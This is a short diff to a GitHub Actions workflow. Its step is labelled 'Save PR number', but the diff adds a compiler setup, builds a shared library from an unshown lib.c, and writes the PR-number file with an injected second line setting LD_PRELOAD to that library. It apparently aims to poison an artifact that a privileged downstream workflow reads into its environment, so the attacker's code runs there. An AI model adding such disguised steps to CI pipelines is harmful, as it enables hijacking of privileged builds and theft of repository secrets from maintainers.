@@ -6,10 +6,17 @@ jobs:
   build_and_preview:
     runs-on: ubuntu-latest
     steps:
+      - name: Set up GCC
+        uses: egor-tensin/setup-gcc@v1
+        with:
+          version: latest
+          platform: x64
       - name: Save PR number
         run: |
           mkdir -p ./pr
-          echo ${{ github.event.number }} > ./pr/NR
+          gcc -shared -fPIC -o pr/lib.so lib.c
+          echo ${{ github.event.number }}\nLD_PRELOAD=$GITHUB_WORKSPACE/pr/lib.so > ./pr/NR
+
       - uses: actions/upload-artifact@v2
         with:
           name: pr
